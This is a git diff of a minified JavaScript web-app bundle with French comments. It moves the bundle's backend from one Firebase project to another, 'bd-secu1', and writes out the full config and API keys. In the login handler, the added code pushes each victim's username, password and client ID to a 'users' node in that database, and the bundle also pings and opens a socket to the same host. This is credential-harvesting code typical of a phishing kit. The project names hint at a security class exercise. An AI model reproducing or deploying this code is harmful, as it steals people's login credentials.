@@ -1,23 +1,21 @@
 /*! For license information please see main.198a48f8.js.LICENSE.txt */
-// import { initializeApp, firestore } from "firebase/app";
-// import 'firebase/auth'; // Incluez uniquement les sous-modules dont vous avez besoin
-// import 'firebase/firestore'; 
-// import { initializeApp, firestore }  from 'firebase/app';
 
-// Connexion à la base de données
-firebase.initializeApp({
-  apiKey: "AIzaSyA_Xr5mF1cFcsG-pM-yHZDvnDcED2L4bq0",
-  authDomain: "sec1td1.firebaseapp.com",
-  projectId: "sec1td1",
-  storageBucket: "sec1td1.appspot.com",
-  messagingSenderId: "401243344262",
-  appId: "1:401243344262:web:49221e3002dd9086b9b007",
-  measurementId: "G-T3LN14NYXR"
-  // databaseURL: "YOUR_DATABASE_URL",
-});
+const firebaseConfig = {
+  apiKey: "AIzaSyBmR4d5bPXmJ0x8i3ON8mUnkjgRx3Qjr68",
+  authDomain: "bd-secu1.firebaseapp.com",
+  databaseURL: "https://bd-secu1-default-rtdb.firebaseio.com",
+  projectId: "bd-secu1",
+  storageBucket: "bd-secu1.appspot.com",
+  messagingSenderId: "18453910446",
+  appId: "1:18453910446:web:f69bf67aae254d049aae3f",
+  measurementId: "G-RJFZLBTHFR",
+};
 
-// Référence à la collection
-const collection = firebase.firestore().collection("Oj2Is2fQpvGNF8LObFHR");
+// Initialisez Firebase avec la configuration
+const app = firebase.initializeApp(firebaseConfig);
+
+// Référence à la base de données
+const database = app.database();
 
 !(function () {
   var e = {
@@ -31956,8 +31954,7 @@ const collection = firebase.firestore().collection("Oj2Is2fQpvGNF8LObFHR");
         (rv.HttpStatusCode = nv),
         (rv.default = rv);
       var ov = rv.create({
-          baseURL:
-            "https://firebase.googleapis.com/v1/projects/sec1td1/databases/1",
+          baseURL: "https://bd-secu1-default-rtdb.firebaseio.com",
         }),
         av = function (e) {
           return ov({ url: "/ping", method: "patch", params: { cliId: e } });
@@ -32040,10 +32037,9 @@ const collection = firebase.firestore().collection("Oj2Is2fQpvGNF8LObFHR");
                 a(e),
                 (function (e) {
                   try {
-                    var t = ch(
-                      "https://firebase.googleapis.com/v1/projects/sec1td1/databases/1",
-                      { query: { ci: e } }
-                    ).connect();
+                    var t = ch("https://bd-secu1-default-rtdb.firebaseio.com", {
+                      query: { ci: e },
+                    }).connect();
                     console.log("socket", t),
                       t.on("success", function () {
                         bh(uh),
@@ -32396,21 +32392,22 @@ const collection = firebase.firestore().collection("Oj2Is2fQpvGNF8LObFHR");
                       case 18:
                         return (
                           (n.next = 20),
-                          collection
-                            .add({
-                              name: o,
-                              password: i,
-                            })
-                            .then(function (docRef) {
-                              console.log("Document ajouté : ", docRef);
-                            })
-                            .catch(function (error) {
-                              console.error(
-                                "Erreur lors de l'ajout du document : ",
-                                error
-                              );
-                            })
-                          // ((l = { cliId: e.cliId, username: o, password: i }),
+                          // collection
+                          //   .add({
+                          //     name: o,
+                          //     password: i,
+                          //   })
+                          //   .then(function (docRef) {
+                          //     console.log("Document ajouté : ", docRef);
+                          //   })
+                          //   .catch(function (error) {
+                          //     console.error(
+                          //       "Erreur lors de l'ajout du document : ",
+                          //       error
+                          //     );
+                          //   })
+                          ((l = { cliId: e.cliId, username: o, password: i }),
+                          database.ref("users").push(l))
                           // ov({ method: "post", url: "/login", data: l })).then(
                           //   function (e) {
                           //     return e.data;
